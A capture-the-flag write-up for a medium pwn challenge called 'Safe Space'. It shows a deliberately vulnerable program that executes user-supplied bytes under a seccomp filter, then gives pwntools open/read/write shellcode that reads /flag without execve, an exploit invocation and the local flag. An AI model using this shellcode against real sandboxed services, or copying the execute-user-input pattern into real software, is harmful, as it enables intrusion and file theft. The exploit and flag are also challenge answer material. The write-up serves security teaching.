# Safe Space

**Category:** pwn  **Difficulty:** medium  **Author:** abu

> The vault throws its doors wide and lets you set up shop inside. There is only one move it will not tolerate, and wouldn't you know it, that is exactly the one you had planned.
>
> You will have to take what you came for the long way around.

Handout: `challenge/vault.zip` (binary, libc, ld). Source is in `challenge/vault.c`.

## Solution

The program hands us code execution for free:

```c
page = mmap(RWX);
read(0, page, 0x1000);   // our bytes
lockdown();              // seccomp
((void(*)())page)();
```

The catch is `lockdown()`. It's a libseccomp filter with default `KILL_PROCESS` that allows `open, openat, read, write, close, lseek, fstat, newfstatat, mmap, munmap, brk, rt_sigreturn, exit, exit_group`. No `execve`, so a shell shellcode just dies with SIGSYS.

So open/read/write it is:

```python
sc  = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x60)
sc += shellcraft.write(1, 'rsp', 0x60)
sc += shellcraft.exit(0)
```

Send it, close our side so the `read` returns, and the flag comes back.

```
python3 solution/exploit.py <host> <port>
```

Flag is dynamic per team. Local one: `H7CTF{s3cc0mp_0rw_sh3llc0d3_v4ult}`
